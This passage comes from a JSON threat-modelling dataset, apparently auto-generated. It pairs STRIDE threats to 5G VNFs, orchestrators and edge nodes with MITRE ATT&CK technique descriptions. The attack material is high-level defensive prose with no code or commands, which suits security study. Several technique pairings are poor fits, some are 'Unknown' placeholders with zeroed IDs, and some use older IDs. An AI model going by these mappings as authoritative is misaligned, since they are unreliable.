a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Disruption of VNFs through resource exhaustion attacks.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of VNF resource management.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of VNF operations"
                },
                {
                    "Assumption": "No effective resource limitation policies in place for VNFs.",
                    "Role": "VNF manager",
                    "Condition": "Lax resource policies"
                },
                {
                    "Assumption": "The monitoring of VNF resource use is inadequate.",
                    "Role": "Security admin",
                    "Condition": "Poor resource monitoring"
                }
            ],
            "Potential Impact": "Service degradation or failure due to VNF resource exhaustion.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "VNF",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disrupts edge computing nodes providing low-latency services.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes are critical for latency-sensitive applications.",
                    "Role": "System designer",
                    "Condition": "Critical edge node operations"
                },
                {
                    "Assumption": "Edge nodes are susceptible to disruption due to insufficient protections.",
                    "Role": "Security admin",
                    "Condition": "Weak edge node protections"
                },
                {
                    "Assumption": "Attack detection and response mechanisms are not prompt or effective.",
                    "Role": "Incident responder",
                    "Condition": "Slow detection/response"
                }
            ],
            "Potential Impact": "Interruption of latency-sensitive services, loss of reliability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "edge computing",
                "latency"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates permissions to gain control over orchestration and management systems.",
            "Assumptions": [
                {
                    "Assumption": "The attacker finds a vulnerability in the privilege management system.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability discovery"
                },
                {
                    "Assumption": "Permissions are not adequately segmented or enforced.",
                    "Role": "Security admin",
                    "Condition": "Weak permission enforcement"
                },
                {
                    "Assumption": "System lacks effective monitoring of privilege escalations.",
                    "Role": "System designer",
                    "Condition": "Inadequate monitoring"
                }
            ],
            "Potential Impact": "Compromise of network management and control, potential for widespread disruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "orchestration",
                "management"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Insider threat leverages access to gain unauthorized control over VNFs.",
            "Assumptions": [
                {
                    "Assumption": "The insider already has some level of access to VNFs.",
                    "Role": "Insider",
                    "Condition": "Existing VNF access"
                },
                {
                    "Assumption": "Role-based access controls are weak or misconfigured.",
                    "Role": "System admin",
                    "Condition": "Misconfigured access controls"
                },
                {
                    "Assumption": "Lack of auditing and monitoring of insider activities.",
                    "Role": "Security admin",
                    "Condition": "Inadequate insider monitoring"
                }
            ],
            "Potential Impact": "Unauthorized control over VNF operations, potential for insider sabotage.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "VNF",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software flaw to elevate privileges within edge nodes.",
            "Assumptions": [
                {
                    "Assumption": "A software flaw exists within the edge node environment.",
                    "Role": "System developer",
                    "Condition": "Software flaw"
                },
                {
                    "Assumption": "The attacker has the means to exploit the identified flaw.",
                    "Role": "Attacker",
                    "Condition": "Exploit capability"
                },
                {
                    "Assumption": "No rapid patching or mitigation mechanisms are in place.",
                    "Role": "Security admin",
                    "Condition": "Slow patching"
                }
            ],
            "Potential Impact": "Full control over edge nodes leading to data compromise and service disruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "edge node",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "2",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates an authorized network slice operator to access and manipulate various VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Lack of strong authentication mechanisms for network slice operators",
                    "Role": "System Architect",
                    "Condition": "Authentication not enforced for network slices"
                },
                {
                    "Assumption": "Attacker has network access to communication channels",
                    "Role": "Security Admin",
                    "Condition": "Network is not isolated from untrusted zones"
                },
                {
                    "Assumption": "No multi-factor authentication (MFA) is implemented",
                    "Role": "Administrator",
                    "Condition": "MFA not required in existing setup"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive VNFs, leading to data breaches and service disruptions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "impersonation",
                "credential access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses spoofed IP addresses to masquerade as a trusted edge or cloud computing node.",
            "Assumptions": [
                {
                    "Assumption": "Edge or cloud nodes do not use mutual TLS for authentication",
                    "Role": "Network Engineer",
                    "Condition": "TLS mutual authentication not implemented"
                },
                {
                    "Assumption": "Network monitoring is insufficient to detect abnormal traffic patterns",
                    "Role": "Security Operations",
                    "Condition": "Lack of comprehensive traffic analysis"
                },
                {
                    "Assumption": "Firewalls do not restrict access based on IP ranges",
                    "Role": "Network Administrator",
                    "Condition": "Firewall policies are not stringent"
                }
            ],
            "Potential Impact": "Potential compromise of data integrity and availability by injecting malicious data or disrupting communications.",
            "MITRE ATT&CK Keywords": [
                "network",
                "spoofing",
                "edge node",
                "cloud node",
                "IP address spoofing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers spoof control plane messages to disrupt federation between different 5G networks.",
            "Assumptions": [
                {
                    "Assumption": "Control plane messages are not authenticated",
                    "Role": "System Developer",
                    "Condition": "Authentication not enforced for control plane messages"
                },
                {
                    "Assumption": "Lack of encryption in control plane communication",
                    "Role": "Security Architect",
                    "Condition": "Messages are sent in plain text"
                },
                {
                    "Assumption": "No integrity checks for incoming messages",
                    "Role": "Network Engineer",
                    "Condition": "Messages are not verified for integrity"
                }
            ],
            "Potential Impact": "Disruption of network federation leading to degraded service and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "control plane",
                "message tampering",
                "network federation"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actor modifies VNFs to include backdoor access, allowing persistent unauthorized access to sensitive data and resources.",
            "Assumptions": [
                {
                    "Assumption": "Lack of software integrity checks for VNFs",
                    "Role": "Software Developer",
                    "Condition": "Integrity checks are not implemented"
                },
                {
                    "Assumption": "Insufficient access controls on VNF repositories",
                    "Role": "Repository Manager",
                    "Condition": "Repository is accessible without strict permissions"
                },
                {
                    "Assumption": "Weak access control policies for orchestrator",
                    "Role": "Orchestrator Admin",
                    "Condition": "Orchestrator does not enforce strict access policies"
                }
            ],
            "Potential Impact": "Loss of confidentiality and integrity of data processed by compromised VNFs.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "VNF",
                "backdoor",
                "persistent access",
                "repository"
            ],
            "mitre_technique": {
                "name": "Fileless Storage",
                "description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless)\n\nSimilar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless) ",
                "id": "attack-pattern--02c5abff-30bf-4703-ab92-1f6072fae939",
                "technique_id": "T1027.011"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies configuration settings within the orchestrator to divert network traffic to unauthorized nodes.",
            "Assumptions": [
                {
                    "Assumption": "No role-based access controls (RBAC) in place",
                    "Role": "Security Administrator",
                    "Condition": "RBAC not implemented"
                },
                {
                    "Assumption": "Change logs and audits are not regularly reviewed",
                    "Role": "Compliance Officer",
                    "Condition": "Audits not conducted"
                },
                {
                    "Assumption": "Orchestrator lacks automated anomaly detection",
                    "Role": "System Architect",
                    "Condition": "Detection systems not integrated"
                }
            ],
            "Potential Impact": "Service disruption, data interception, and possible leakage of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestrator",
                "configuration settings",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious updates to hypervisor or container images leading to unauthorized code execution.",
            "Assumptions": [
                {
                    "Assumption": "No code integrity checks or digital signatures for updates",
                    "Role": "DevOps Engineer",
                    "Condition": "Integrity checks not applied"
                },
                {
                    "Assumption": "Insufficient access controls for update repositories",
                    "Role": "Repository Manager",
                    "Condition": "Access controls are minimal"
                },
                {
                    "Assumption": "No real-time monitoring of hypervisor/container integrity",
                    "Role": "Security Analyst",
                    "Condition": "Monitoring tools not deployed"
                }
            ],
            "Potential Impact": "Loss of integrity and confidentiality of the system hosting the affected components.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "hypervisor",
                "container",
                "code execution",
                "update"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny actions performed on the management interface of the orchestrator leading to misconfiguration and service issues.",
            "Assumptions": [
                {
                    "Assumption": "Action logging is not comprehensive",
                    "Role": "System Administrator",
                    "Condition": "Logging not enforced"
                },
                {
                    "Assumption": "User actions are not associated with distinct identifiers",
                    "Role": "Identity Manager",
                    "Condition": "Identifiers not assigned"
                },
                {
                    "Assumption": "No multi-factor authentication (MFA) implemented",
                    "Role": "Security Engineer",
                    "Condition": "MFA not required"
                }
            ],
            "Potential Impact": "Difficulties in troubleshooting and accountability issues during security audits.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "orchestrator",
                "management interface",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Operators deny receiving crucial control messages leading to breakdown of inter-network functionalities.",
            "Assumptions": [
                {
                    "Assumption": "No message delivery confirmation system in place",
                    "Role": "Network Engineer",
                    "Condition": "Confirmation systems not implemented"
                },
                {
                    "Assumption": "Control messages are not logged",
                    "Role": "System Operator",
                    "Condition": "Logging mechanisms are absent"
                },
                {
                    "Assumption": "Lack of cryptographic message tokens",
                    "Role": "Security Architect",
                    "Condition": "Tokens not used for message verification"
                }
            ],
            "Potential Impact": "Breakdown in service interoperability and efficiency.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "control messages",
                "network functionalities",
                "denial"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Lack of audit trails allows an insider to manipulate billing functions without detection.",
            "Assumptions": [
                {
                    "Assumption": "System does not support extensive auditing",
                    "Role": "System Developer",
                    "Condition": "Audit logs are not generated"
                },
                {
                    "Assumption": "Changes are not timestamped or associated with user IDs",
                    "Role": "Data Manager",
                    "Condition": "Timestamps or user associations are not applied"
                },
                {
                    "Assumption": "No access control monitoring",
                    "Role": "Security Analyst",
                    "Condition": "Monitoring systems are unimplemented"
                }
            ],
            "Potential Impact": "Financial losses and lack of accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit trails",
                "billing",
                "manipulation",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Intercepted network traffic from external interfaces revealing sensitive user and operational data.",
            "Assumptions": [
                {
                    "Assumption": "Data is not encrypted in transit",
                    "Role": "Network Architect",
                    "Condition": "Encryption not enforced"
                },
                {
                    "Assumption": "Public interfaces are not throughput limited",
                    "Role": "Security Operator",
                    "Condition": "Interfaces are accessible without restrictions"
                },
                {
                    "Assumption": "No Intrusion Detection System (IDS) / Intrusion Prevention System (IPS) monitoring traffic",
                    "Role": "Security Administrator",
                    "Condition": "IDS/IPS systems are not active"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational data and user data, compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network traffic",
                "interception",
                "user data",
                "operational data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
